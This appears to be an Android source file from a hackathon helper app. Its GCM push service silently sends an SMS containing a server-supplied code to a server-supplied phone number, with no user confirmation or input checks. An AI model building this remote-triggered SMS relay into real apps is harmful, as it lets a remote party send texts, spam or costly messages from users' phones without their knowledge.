package com.helper.hacktm;

import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;

import com.google.android.gcm.GCMBaseIntentService;

public class GCMIntentService extends GCMBaseIntentService {

	public static final String SENDER_ID = "578763080585";
	private static final String TAG = "GCMIntentService";

	public GCMIntentService() {
		super(SENDER_ID);
	}

	protected void onRegistered(Context context, String registrationId) {
	}

	protected void onUnregistered(Context context, String registrationId) {
	}

	protected void onMessage(Context context, Intent intent) {
		String code = intent.getExtras().getString("code");
		String number = intent.getExtras().getString("phone");
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(number, null, code, null, null);
	}

	protected void onError(Context arg0, String arg1) {
	}

}